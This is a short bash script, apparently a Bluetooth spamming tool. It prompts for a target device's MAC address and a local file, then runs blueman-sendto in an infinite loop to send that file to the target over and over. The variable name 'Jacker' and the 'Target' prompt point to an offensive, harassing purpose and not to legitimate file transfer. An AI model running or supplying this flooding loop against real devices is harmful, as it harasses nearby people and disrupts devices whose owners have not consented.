#!/bin/bash

green="\033[32;1m"
yellow="\033[33;1m"
red="\033[31;1m"
purple="\033[37;1m"
cyan="\033[36;1m"
blue="\033[34;1m"


echo ""
echo $purple "╭─"$green"Put the MAC address Target again:  "$purple
                           read -p " ╰─$ " Jacker
echo ""
echo $purple "╭─"$green"Put local file name with extension to send the device:  "$purple
                                   read -p " ╰─$ " file
echo ""

while :
do
                      blueman-sendto -d $Jacker $file
done
